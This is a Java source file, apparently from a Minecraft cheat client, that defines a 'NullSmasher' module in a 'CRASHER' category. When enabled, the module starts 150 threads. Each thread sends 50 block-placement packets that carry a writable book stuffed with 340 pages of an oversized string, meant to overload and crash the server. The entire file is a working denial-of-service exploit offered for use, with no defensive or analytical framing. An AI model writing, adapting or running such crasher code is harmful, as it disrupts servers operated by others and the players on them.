package net.sssssssthedev.SmartClient.module.crasher;

import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.util.BlockPos;
import net.sssssssthedev.SmartClient.module.Category;
import net.sssssssthedev.SmartClient.module.Module;
import org.lwjgl.input.Keyboard;

import java.util.Random;

public class NullSmasher extends Module {

    public NullSmasher() {
        super("NullSmasher", Keyboard.KEY_0, Category.CRASHER);
    }

    Thread t;

    public void onEnable() {
        for (int i = 0; i < 150; i++)
            crash();
        super.onEnable();
    }

    public void onDisable() {
        this.t.interrupt();
        super.onDisable();
    }

    private void crash() {
        this.t = new Thread(() -> {
            for (int i2 = 0; i2 < 50; i2++) {
                ItemStack book = new ItemStack(Items.writable_book);
                String author = "Netty" + (new Random()).nextInt(50);
                String size = ".................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................";
                NBTTagCompound tag = new NBTTagCompound();
                NBTTagList list = new NBTTagList();
                for (int i3 = 0; i3 < 340; i3++) {
                    NBTTagString tString = new NBTTagString(size);
                    list.appendTag(tString);
                }
                tag.setString("author", author);
                tag.setString("title", "");
                tag.setTag("pages", list);
                if (book.hasTagCompound()) {
                    NBTTagCompound tagb = book.getTagCompound();
                    tagb.setTag("pages", list);
                } else {
                    book.setTagInfo("pages", list);
                }
                Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C08PacketPlayerBlockPlacement(new BlockPos((Minecraft.getMinecraft()).thePlayer.posX, (Minecraft.getMinecraft()).thePlayer.posY - 2.0D, (Minecraft.getMinecraft()).thePlayer.posZ), 1, book, 0.0F, 0.0F, 0.0F));
            }
        });
        this.t.start();
    }
}
